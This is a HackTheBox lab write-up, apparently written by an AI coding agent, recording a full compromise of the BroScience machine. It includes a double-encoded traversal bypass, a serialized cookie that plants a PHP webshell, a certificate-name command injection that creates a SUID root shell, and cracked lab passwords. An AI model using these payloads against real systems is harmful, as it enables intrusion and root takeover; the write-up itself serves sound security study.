# BroScience (HTB) — Session Writeup

> **Context for the reader:** this is a handoff document written by one
> Claude Code session for another. It records a HackTheBox machine worked
> through on 2026-08-18. It is a *learning log*, not a polished walkthrough —
> the mistakes and false starts are deliberately included because they are
> the most reusable part. The box was **completed** — user and root; see
> "Outcome".

---

## Target

| | |
|---|---|
| Machine | BroScience (HTB, Linux, Medium) |
| IP | `10.129.228.129` |
| Hostname | `broscience.htb` |
| OS | Debian 11 (bullseye), full desktop install |

**Ports (full TCP sweep):**

| Port | Service | Version |
|---|---|---|
| 22 | ssh | OpenSSH 8.4p1 Debian 5+deb11u1 |
| 80 | http | Apache 2.4.54 — blanket 301 → `https://broscience.htb/` |
| 443 | ssl/http | Apache 2.4.54 — the application |

PostgreSQL is installed but **bound to localhost** (never appeared in the
all-ports scan; inferred from a `postgres` account in `/etc/passwd` and
confirmed from application source).

The app is hand-written PHP with a UIkit 3.15.0 frontend. Pages: `index.php`,
`login.php`, `register.php`, `activate.php`, `logout.php`, `user.php`,
`exercise.php`, `comment.php`, plus `includes/{db_connect,header,img,navbar,utils}.php`.

---

## Full chain

```
unauth LFI (includes/img.php?path=, double-URL-encoded)          [Technique 1]
  └─> arbitrary file read as www-data                            [Technique 2]
        ├─> /etc/passwd             -> user `bill` (uid 1000, /bin/bash)
        ├─> includes/db_connect.php -> postgres creds + hash salt "NaCl"
        └─> includes/utils.php      -> two separate design flaws:
              ├─ generate_activation_code() seeded with srand(time())
              │    -> activation codes are PREDICTABLE            [Technique 3]
              │    -> activate an account we register
              │    -> obtain a valid logged-in session
              └─ get_theme() calls unserialize() on a client-controlled cookie
                   -> PHP object injection, gated on that session [Technique 4]
                        -> AvatarInterface::__wakeup() gadget
                             -> webshell -> RCE as www-data
                                  -> psql (localhost-only, now reachable)
                                       -> users table -> crack md5("NaCl".pw)
                                            -> bill:iluvhorsesandgym
                                                 -> SSH          [user.txt]
                                                      -> root cron job
                                                           -> $commonName
                                                              re-parsed by
                                                              bash -c        [Technique 5]
                                                                -> SUID bash [root.txt]
```

**The flaws are chained, not independent.** The deserialization sink is gated
behind `isset($_SESSION['id'])`, and the only way to obtain a session is to
activate an account, which requires predicting the activation code. Neither
flaw is exploitable alone.

**Techniques 1 and 5 are the same bug in different languages** — see the
table in Technique 5. That symmetry is the single most transferable thing
this box teaches.

---

## Technique 1 — LFI filter bypass by double URL encoding

**The endpoint.** Images are served indirectly: `includes/img.php?path=bench.png`.
Requesting `img.php` with no parameter returns `<b>Error:</b> Missing 'path'
parameter.`, confirming a user-controlled path into a file read.

**Two filters, both defeated by the same trick.** Naive traversal
(`../../../etc/passwd`) returned `<b>Error:</b> Attack detected.`

The working payload double-URL-encodes the traversal:

```
GET /includes/img.php?path=.%252e%252f.%252e%252f.%252e%252f...etc/hosts
```

**Why this works — the decode-order insight (the transferable part):**

1. `%25` is the encoding of `%`. So `.%252e%252f` arrives on the wire and
   Apache/PHP performs the standard **one** URL decode, yielding `.%2e%2f`.
2. The application's filter inspects *that* string. It contains no literal
   `../`, so it passes.
3. The application then calls `urldecode()` on the parameter **itself** —
   a second decode — turning `.%2e%2f` into `../`.

So the vulnerability is not "there is no filter"; it is **the filter runs at
a different decode stage than the sink**. Any input transformation applied
after validation reopens whatever the validation closed.

**Second filter, same root cause.** `etc/passwd` still returned `Attack
detected` while `etc/hosts` succeeded — proving a *keyword denylist on the
filename*, separate from the traversal check. The diagnostic question was
whether that denylist ran before or after the app's own decode. One request
settled it:

```
etc/pass%2577d      ->  200, full /etc/passwd
```

(`%2577` → `%77` after the wire decode, so the filter never sees the string
`passwd`; → `w` after the app's decode.) **Both filters run pre-decode.**

**Generalised primitive:** double-encode *any* byte of the path — separator
or filename — and the entire filter chain is blind. Encoding every byte is
strictly safer than encoding only the separators, because it also defeats
filename-level denylisting.

**Operational detail:** `img.php` returns `Content-Type: image/png`
regardless of what it actually read. Raw bytes land in the body and nothing
renders. When triaging bulk output, sort by **response length**, not status
or MIME type — hits are easy to mistake for misses.

---

## Technique 2 — source disclosure changes the enumeration strategy

With arbitrary read, the next move was to pull the application's own source.
Two things made this efficient:

**`mod_autoindex` was enabled.** `/includes/`, `/images/` and `/styles/` all
rendered directory listings, giving the exact filename set with no guessing.
The tell in crawl output is the presence of `?C=M;O=A` / `?C=N;O=D` style
column-sort links (Apache only emits those when rendering a listing), plus
references to `/icons/folder.gif`, `/icons/text.gif` etc.

**Webroot did *not* list**, because it has an `index.php`. Root-level files
were therefore only discoverable if something linked to them — and
`activate.php` is linked from nowhere in the UI.

It was found by reading source, not by fuzzing:

```php
// register.php:44
$activation_link = "https://broscience.htb/activate.php?code={$activation_code}";
```

**Lesson: once you have file read, `grep` the retrieved source for URLs
instead of brute-forcing the filesystem.** The application will name its own
endpoints. Brute force is the fallback, not the first move.

---

## Technique 3 — predictable PRNG (`srand(time())`)

```php
// includes/utils.php:2
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(time());
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code .= $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}
```

A 32-character code from a 62-character alphabet looks unbreakable, and by
brute force it is:

```
62^32 = 2.27e57 candidates
      = ~7.2e40 years at 10^9 guesses/second
```

**But the output is not 32 independent choices — it is one choice (the seed)
expanded deterministically.** `srand()` seeds a PRNG; identical seed produces
an identical sequence, always.

And the seed is `time()`: the Unix timestamp in seconds. That value is
**publicly disclosed by the server in the `Date:` response header of the very
response that confirms registration.**

The real search space collapses to the uncertainty window:

| window | candidates |
|---|---|
| ±5 seconds | 11 |
| 1 hour | 3,600 |
| 1 day | 86,400 |

**The security lesson is two-layered:** using `rand()` for a security token
is the bug; seeding it with a value the server publishes in every response is
what makes it trivially exploitable rather than merely weak. Correct
construction would be `random_bytes()` / `bin2hex(random_bytes(16))`.

**Implementation note:** on PHP 7.1+, `rand()` is an alias of `mt_rand()` and
`srand()` of `mt_srand()` — Mersenne Twister, not the old libc LCG. Do not
reimplement the generator; run the target's own function in a local PHP with
a candidate seed. Identical code, identical output.

**The consuming endpoint had no compensating controls.** `activate.php`
validates only the *shape* of the code (`preg_match('/^[A-z0-9]{32}$/')`) and
imposes no rate limit, no attempt counter and no expiry — so trying thousands
of candidates is free.

### Procedure

1. `POST /register.php`, capture the `Date:` response header.
2. Convert to Unix epoch (`date -u -d '<Date>' +%s`).
3. Run a copy of `generate_activation_code()` taking the seed as an argument,
   looping `seed-5 .. seed+5`, writing candidates to a file.
   (The window only needs to reach *backwards*: `time()` is called during
   request processing, before Apache stamps `Date`, so true seed ≤ epoch.)
4. Fuzz them at `activate.php?code=FUZZ`.
5. Log in with the credentials just registered.

---

## Technique 4 — PHP object injection via a serialized cookie

**Exploited 2026-08-18 — webshell obtained.** (Was "identified but not yet exploited" at first writing.)

```php
// includes/utils.php:63
function get_theme() {
    if (isset($_SESSION['id'])) {
        if (!isset($_COOKIE['user-prefs'])) {
            $up_cookie = base64_encode(serialize(new UserPrefs()));
            setcookie('user-prefs', $up_cookie);
        } else {
            $up_cookie = $_COOKIE['user-prefs'];
        }
        $up = unserialize(base64_decode($up_cookie));   // <-- sink
        return $up->theme;
    } else {
        return "light";
    }
}
```

Default value minted by the server:

```
O:9:"UserPrefs":1:{s:5:"theme";s:5:"light";}
Tzo5OiJVc2VyUHJlZnMiOjE6e3M6NToidGhlbWUiO3M6NToibGlnaHQiO30=
```

**Why this is object injection and not merely tampering:** `unserialize()`
does not parse data, it **constructs objects**, and construction fires PHP
magic methods (`__wakeup()`, `__destruct()`, …). The attacker therefore
controls *which class is instantiated*, not just what values it holds — the
declared type of `$up` is irrelevant, since the class name is embedded in the
serialized bytes. Any class already loaded in that request's scope is
reachable.

`utils.php` is included on every page, so every class it defines is in scope.
It defines two that the theme system never uses:

```php
class Avatar {
    public $imgPath;
    public function save($tmp) { /* writes file_get_contents($tmp) to $imgPath */ }
}
class AvatarInterface {
    public $tmp;
    public $imgPath;
    public function __wakeup() { $a = new Avatar($this->imgPath); $a->save($this->tmp); }
}
```

Both properties are `public`, i.e. settable directly from the cookie. Related
dead-code signal: `<!-- TODO: Avatars -->` markers in `user.php` — a
half-built feature whose classes still get loaded on every request.

**Constraints:**
- Requires an authenticated session (the `isset($_SESSION['id'])` gate).
- Runs on essentially every authenticated page — `navbar.php` calls
  `get_theme_class()` → `get_theme()`, and navbar is included everywhere.
- No signature, HMAC, or validation of any kind on the cookie.
- `set_theme()` is defined but called from nowhere — there is no UI to change
  the theme, which is why `styles/dark.css` sits unreferenced. The cookie is
  the only thing that ever determines the value.

---

## Technique 5 — command injection through a re-parsed shell string

The privesc, and the same root cause as Technique 1 in a different language.

`pspy` as `bill` revealed a root cron job (the first burst of pspy output is
its *startup inventory*, not events — the real hit carries a later timestamp):

```
UID=0 | /bin/bash /root/cron.sh
UID=0 | timeout 10 /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt
UID=0 | /usr/bin/rm -r /home/bill/Certs/*
```

A **root** process taking its input from a directory the **unprivileged user
owns**. `/opt/renew_cert.sh` is world-readable; its last line is:

```bash
/bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
```

`$commonName` is parsed out of the certificate's Common Name — entirely
attacker-supplied — and is expanded **twice**:

1. The script's own bash splices `$commonName` into the string. The result is
   still just *text* containing the characters `$`, `(`, `c`, `p`…
2. That text is passed to **`/bin/bash -c`**, which parses it **as code**.
   Now `$(...)` is command substitution, and it runs as root.

**`/bin/bash -c` is the whole vulnerability, and it is gratuitous.** `mv` is a
binary, not a shell builtin — it needs no shell. Written as
`mv /tmp/temp.crt "/home/bill/Certs/$commonName.crt"`, the identical payload
produces a file with a silly name and zero execution.

> **The generalisation, and the reason this box is worth remembering:** it
> contains the same bug class twice, in two unrelated languages.
>
> | | validated / built in | interpreted in |
> |---|---|---|
> | `img.php` | the once-decoded string | the string after a **second** `urldecode()` |
> | `renew_cert.sh` | — (no validation at all) | the string after a **second** shell parse |
>
> Every injection bug is an order-of-operations bug: data placed into a
> string, then parsed at a point where data and code are indistinguishable.

### Order of operations — why it fires regardless of `mv`

Bash expands an entire command line *before* executing it:

```
PHASE 1  expansion   fork subshell → cp → chmod → capture stdout ("") → splice
PHASE 2  execution   execve("/bin/mv", ["mv","/tmp/temp.crt","/home/bill/Certs/.crt"])
```

The payload runs in phase 1, so it fires **whether or not `mv` succeeds**.
`mv` is merely the vehicle that got the data into a shell parse. And since
`cp`/`chmod` are silent, the substitution yields `""` and the destination
collapses to `/home/bill/Certs/.crt` — a dotfile, which `rm -r .../*` does
not match. A stray `.crt` is the fingerprint that the injection fired.

### Reaching the vulnerable line

Two gates precede it. `[ -f $1 ]`, and:

```bash
openssl x509 -in $1 -noout -checkend 86400 > /dev/null
if [ $? -eq 0 ]; then echo "No need to renew yet."; exit 1; fi
```

`-checkend N` returns **0 when the certificate is still valid** for the next
N seconds — so a healthy cert *stops* the script. Generating with `-days 1`
makes it return non-zero and execution continues. (An empty or unparseable
file also passes: `openssl` errors out, which is indistinguishable from
"expiring" to a bare `$?` test.)

### The payload

```bash
rm -f /tmp/rootbash          # mandatory — see below

openssl req -x509 -newkey rsa:2048 -nodes -keyout /dev/null \
  -out broscience.crt -days 1 \
  -subj '/C=AT/ST=Vienna/L=Vienna/O=BroScience/OU=IT/CN=$(cp \/bin\/bash \/tmp\/rootbash; chmod 4755 \/tmp\/rootbash)/emailAddress=test@broscience.htb'

openssl x509 -in broscience.crt -noout -subject     # verify BEFORE deploying
cp broscience.crt /home/bill/Certs/broscience.crt   # wait for cron

/tmp/rootbash -p && id                              # euid=0
```

### Two independent quoting layers

This cost more time than the rest of the box combined, and it generalises to
any injection delivered through a structured format.

**Layer 1 — your shell.** Must be **single** quotes. In double quotes your own
shell runs `$(...)` immediately; `cp` prints nothing, so the CN becomes an
empty string and openssl *silently drops the entire CN field*. The
certificate looks fine and carries no payload. **This failure is
indistinguishable from success at a glance** — `/tmp/rootbash` does appear,
owned by the unprivileged user. Verify with `openssl x509 -noout -subject`,
never by whether the file showed up.

**Layer 2 — OpenSSL's DN parser.** Inside `-subj`, these characters are
structural and need backslash-escaping:

| char | role in a DN | escape |
|---|---|---|
| `/` | field separator | `\/` |
| `+` | multi-valued RDN separator | `\+` |
| `=` | attribute/value separator | `\=` |
| `,` | RDN separator | avoid — the script's `awk -F,` truncates there too |

`+` is the non-obvious one: `chmod +s` silently truncates the payload at the
`+`, and the only warning is `req warning: Skipping unknown subject name
attribute`. Using `chmod 4755` sidesteps it entirely. **Keep `2>/dev/null`
off while testing** so that warning is visible.

These escapes are consumed by openssl — the certificate stores clean text.
Escaping only ever exists *between two adjacent layers*.

Alternative that avoids layer 2 completely — answer the seven prompts on
stdin, single-quoted so the payload stays literal:

```bash
printf 'AT\nVienna\nVienna\nBroScience\nIT\n$(cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash)\ntest@broscience.htb\n' \
  | openssl req -x509 -newkey rsa:2048 -nodes -keyout /dev/null -out broscience.crt -days 1
```

### Four gotchas that each produce a convincing false result

1. **`rm -f /tmp/rootbash` first.** `cp` onto an *existing* file reuses that
   inode — uid/gid are preserved. Root's copy inherits the **unprivileged
   user's** ownership, `chmod` sets setuid on a file that user owns, and you
   get a setuid-*yourself* shell that looks perfect in `ls -la`.
2. **`bash -p`.** Bash drops its effective uid on startup unless invoked with
   `-p`. Without it you get a shell that appears to have worked and is still
   you.
3. **`chmod g+s` is not enough** — that sets egid 0 only, euid unchanged.
   Needs `u+s` / `+s` / `4755`.
4. **`timeout 10`** wraps the cron invocation, so a reverse shell spawned
   inside it is a ten-second window you have to catch live. A SUID binary or
   a dropped SSH key persists; prefer those.

---

## Concrete findings

**Credentials (PostgreSQL, from `includes/db_connect.php`):**

```
host localhost   port 5432   db broscience
user dbuser      pass RangeOfMotion%777
```

Not reachable from the VPN (localhost-bound). **Not reused** on any
application account — tested and disproven, see below.

**Password hashing:** `md5($db_salt . $password)` with a hardcoded global
`$db_salt = "NaCl"` — unsalted-per-user MD5 in all but name. Relevant if
hashes are ever recovered.

**Application users** (via unauthenticated IDOR on `user.php?id=`, which
leaks email, activation state *and* the admin flag for any id):

| id | user | email | admin |
|---|---|---|---|
| 1 | administrator | administrator@broscience.htb | yes |
| 2 | bill | bill@broscience.htb | no |
| 3 | michael | michael@broscience.htb | no |
| 4 | john | john@broscience.htb | no |
| 5 | dmytro | dmytro@broscience.htb | **yes** |

All five activated. **`dmytro` (id 5) appears nowhere in the site's HTML** —
no exercises, no comments, no links. It exists only because `user.php` serves
any id without authentication and the ids were walked manually.

**`bill` is the only name present on both sides** — application user id 2 and
Linux uid 1000 with `/bin/bash` and a home directory, on a host with SSH
exposed.

---

## Dead ends (with reasons — do not re-walk these)

- **SQL injection — genuinely absent.** All 12 queries use `pg_prepare()` +
  `pg_execute()` with positional placeholders (`$1`, `$2`); user input is
  only ever passed in the parameter array. The single raw `pg_query()`
  (`index.php:23`) has a fully static query. Both `?id=` parameters are
  additionally gated by `FILTER_VALIDATE_INT`. Confirmed from source, not
  guessed from black-box results.
- **`/home/bill/.ssh/` unreadable via LFI** — empty responses for `id_rsa`,
  `id_ed25519`, `authorized_keys`. Expected: `~/.ssh` is `0700 bill:bill`.
  Not a payload failure; `/etc/passwd` through the same primitive works. The
  LFI is bounded by what uid 33 (`www-data`) can read.
- **Password reuse of `RangeOfMotion%777` — disproven** across all five app
  accounts.
- `.htaccess` — 403 over HTTP (readable via LFI, unremarkable).
- Guessed admin passwords (`password`, `password123`) — no.

---

## Methodology errors made this session

These cost the most time and are the most transferable.

**1. Fuzzing the wrong scheme, then filtering the only status code returned.**

```bash
# WRONG — returns nothing, and the nothing is meaningless
ffuf -u http://broscience.htb/FUZZ.php -w ... -fc 301
```

Port 80 blanket-redirects everything to HTTPS, so *every* path — real or
invented — returns an identical 301. `-fc 301` then filtered 100% of
responses. The run printed zero hits and looked like a clean "no hidden
files" result while having tested nothing. This is how `activate.php` stayed
hidden. **A filter that matches the baseline for every request produces a
false all-clear, not a negative result.** Always confirm your scan config
against a file you *know* exists (a positive control).

**2. A crashed scan is not a completed scan.** An earlier content-discovery
run died partway through. The risk isn't the one file it missed — it is that
the entire sweep silently becomes unreliable while still feeling done.

**3. Apache's `/manual/` poisoned link extraction.** The default Apache
manual was exposed (thousands of pages in 13 languages). A link-extraction
pass over it produced ~99% junk — and worse, it resolved *example filesystem
paths in the documentation prose* into plausible-looking URLs:
`https://broscience.htb/var/www/html`, `/usr/local/apache/htdocs/…`,
`/etc/hosts`, `/page.php?page=123`, `/siteler/…` (from the Turkish
translation). None of those existed; nothing had fetched them. **Exclude
vendor documentation trees from crawl scope, and never treat extracted URLs
as discovered paths without a status code behind them.**

**4. A `%` in a password silently mangled by form encoding.** The candidate
password was `RangeOfMotion%777`. Pasted raw into a form-urlencoded body,
`%77` decodes to `w` and the server receives `RangeOfMotionw7` — a
plausible-looking password that is not the one intended. The wire value must
be `RangeOfMotion%25777`. This produces clean "incorrect" responses and a
**false negative on the whole password-reuse theory**. Mitigation used: post
through a library's form encoder rather than a hand-built body, and include
a deliberately-mangled *control row* in the test matrix — if the control and
the real value behave identically, encoding is eliminated as a variable and
the negative can be trusted.

**5. Copy-pasting instance-specific values out of a published writeup.** The
official HTB writeup's activation codes were generated from seed
`1673269358` on a box at `10.10.11.195`. They were saved and nearly used
against a different instance from a different year. **Anything in a writeup
derived from a timestamp, an IP, a session, or a response size is dead on
arrival elsewhere.** Re-derive; don't transcribe.

**5b. Wordlist coverage is not scan correctness.** A clean, completed ffuf run
still missed `swap_theme.php` and `update_user.php`:
`directory-list-2.3-medium` contains `swap`, `theme`, `update` and `user`
individually but no underscore-joined compounds. Nothing in the output looked
wrong — and both files were **already named in source retrieved hours
earlier** (`navbar.php:15`, `user.php:94`). The lesson from Technique 2 had
been learned and then not applied. **With file read available,
`grep -rhoE '[A-Za-z0-9_/.-]+\.php'` over retrieved source beats any
wordlist. Run it first, and re-run it every time new source lands.**

**5c. Distro kernel versions don't mean what the headline says.** Dirty Pipe
(CVE-2022-0847) was considered against `5.10.0-20-amd64`. It was fixed
upstream in **5.10.102**; the box ran Debian `5.10.158-2`. Debian pins
major.minor for a release's lifetime and backports fixes into the *third*
component, so a "5.10 kernel" can be better patched than a mainline 6.x.
Compare the third number against the upstream fix **and** the package version
against the distro's security tracker. `searchsploit`-style matching on
"5.10" yields piles of long-patched CVEs.

**5d. "No sudo rights" is not "the sudo binary is safe."** `sudo` was setuid
and present while `bill` had no sudoers entry. CVE-2021-3156 (Baron Samedit)
is reachable by any local user regardless of sudoers, so the version still
warranted a check. (It was patched — but the reasoning for skipping it was
wrong.)

**5e. Success and failure can be indistinguishable.** Two separate instances
on this box:
- A double-quoted `$(...)` in `-subj` runs in *your* shell, produces empty
  output, and openssl silently drops the CN. `/tmp/rootbash` appears anyway —
  owned by the unprivileged user. It looks exactly like the exploit worked.
- `cp` onto an existing file reuses that inode and preserves ownership, so
  root's copy stays owned by the unprivileged user; `chmod +s` then yields a
  setuid-*nobody-useful* binary that reads correctly in `ls -la`.

**Verify the mechanism, not the symptom.** `openssl x509 -noout -subject` to
confirm the payload is in the certificate; `ls -la` for `root root` ownership
*and* the `s` bit; `id` after `bash -p`. Each of those checks the thing that
actually has to be true, rather than a side effect that occurs either way.

**6. Byte-size response filters are brittle.** The writeup used
`ffuf --fs 1256` to hide the "Invalid activation code." page. That number is
instance-specific; if it is off by one byte, every candidate is filtered
*including the correct one*, and the result looks like a failed seed
calculation rather than a bad filter. Preferred:

```bash
ffuf -w activation_codes.txt -u 'https://broscience.htb/activate.php?code=FUZZ' \
     -k -mr 'Account activated'
```

**Match on the semantic success string, not on a byte count.** (Safe here:
`Account already activated.` does not contain the substring
`Account activated`.)

---

## Outcome

**Rooted 2026-08-19. user.txt + root.txt.**

Full chain: unauthenticated arbitrary file read → application source →
predicted activation code → authenticated session → PHP object injection →
webshell as `www-data` → PostgreSQL → cracked hashes → SSH as `bill`
(user.txt) → command injection in a root cron script (root.txt).

### The gadget that worked

`AvatarInterface::__wakeup()` → `Avatar::save()` → `fopen($imgPath,"w")` +
`fwrite(file_get_contents($tmp))`. Because `file_get_contents()` accepts
stream wrappers, `tmp` can carry the shell body inline — no listener needed.
Both properties are `public`, so no NUL-byte name mangling.

```
O:15:"AvatarInterface":2:{s:3:"tmp";s:44:"data://text/plain,<?php system($_GET[0]); ?>";s:7:"imgPath";s:20:"/var/www/html/sh.php";}
```

```
user-prefs cookie (base64):
TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czo0NDoiZGF0YTovL3RleHQvcGxhaW4sPD9waHAgc3lzdGVtKCRfR0VUWzBdKTsgPz4iO3M6NzoiaW1nUGF0aCI7czoyMDoiL3Zhci93d3cvaHRtbC9zaC5waHAiO30=
```

Set while authenticated, then hit any page (navbar → `get_theme_class()` →
`get_theme()` fires it everywhere). Collect at `/sh.php?0=id`.

**Note `$_GET[0]` — a numeric key.** A bare `$_GET[cmd]` is a fatal `Error`
on PHP 8, and quoting it collides with the surrounding serialized-string
quotes. Numeric index sidesteps both.

### From foothold to root

**PostgreSQL became reachable** once on-box — it is localhost-bound and was
unusable from the VPN.

```bash
cd /tmp   # see "shell hygiene" below
PGPASSWORD='RangeOfMotion%777' psql -h localhost -U dbuser -d broscience -c 'SELECT * FROM users;'
```

Hashes are `md5("NaCl" . password)` — a **static global prefix, not a
per-user salt**, so identical passwords collide across accounts and one
wordlist pass covers every row. `hashcat -m 20` (`md5($salt.$pass)`), lines
formatted `hash:NaCl`. Three of five fell to plain rockyou:

| user | password |
|---|---|
| **bill** | `iluvhorsesandgym` |
| michael | `2applesplus2apples` |
| dmytro | `Aaronthehottest` |

`administrator` and `john` survived rockyou unruled — neither was needed.

**`bill` was the pivot**: app user id 2 *and* Linux uid 1000 with `/bin/bash`,
on a host with SSH open. The app password was reused on the system account →
`ssh bill@target` → **user.txt**.

Note this does *not* contradict the disproven password-reuse entry under Dead
ends: that was the **DB** password against **app** accounts. This is the
**app** password against the **system** account. Different pair, opposite
result — worth stating explicitly, because "password reuse doesn't work here"
is exactly the kind of note that stops you retrying the right pair later.

Then `pspy` → root cron → Technique 5 → **root.txt**.

### Shell hygiene worth recording

- **`getcwd` errors in a webshell** (`shell-init: error retrieving current
  directory`, then `psql: could not find own program executable`) — the
  process's cwd could not be resolved. `getcwd()` needs `+x` on *every*
  ancestor directory, and `psql` resolves its own binary relative to cwd, so
  it can't even start. Fix: `cd /tmp`.
- **`psql`'s interactive password prompt fails without a PTY** — it reads
  `/dev/tty` with echo disabled, which a raw webshell or reverse shell does
  not have. Use `PGPASSWORD`, or upgrade first:
  `python3 -c 'import pty; pty.spawn("/bin/bash")'`, then `Ctrl-Z`,
  `stty raw -echo; fg`, then `export TERM=xterm`.

### Artifacts left behind

- `/var/www/html/sh.php` — unauthenticated RCE for anyone who requests it.
- `/tmp/rootbash` — world-executable SUID root shell.

Not removed here, because an HTB machine is a per-user instance destroyed on
shutdown. Recorded anyway: on a real engagement both are mandatory cleanup —
either one silently hands the next visitor the same access you worked for,
and an unauthenticated webshell in a webroot is arguably worse than the
vulnerability that put it there.

---

## Concepts worth linking in the vault

**Umbrella concept this box argues for:** `data re-parsed as code` — the
shared root cause of Techniques 1 and 5, and arguably of every injection
class. Worth being a hub note that LFI, command injection, SQLi and XSS all
link back to.

`Local File Inclusion` · `path traversal` · `double URL encoding` ·
`filter evasion` · `decode-order / parser differential` ·
`source code disclosure` · `mod_autoindex` · `directory listing` ·
`insecure randomness` · `PRNG seeding` · `srand / mt_srand` ·
`account activation bypass` · `PHP object injection` ·
`insecure deserialization` · `magic methods (__wakeup)` · `gadget chain` ·
`data:// stream wrapper` · `IDOR` · `user enumeration` · `password reuse` ·
`prepared statements` · `unsalted / static-salt hashing` · `hashcat mode 20` ·
`command injection` · `command substitution` · `shell quoting layers` ·
`cron privilege escalation` · `privileged process, unprivileged input` ·
`SUID binaries` · `bash -p` · `pspy` · `openssl DN escaping` ·
`positive controls in scanning` · `false-negative scan results` ·
`wordlist coverage vs scan correctness` ·
`distro kernel backports vs upstream versions` ·
`verify the mechanism, not the symptom`
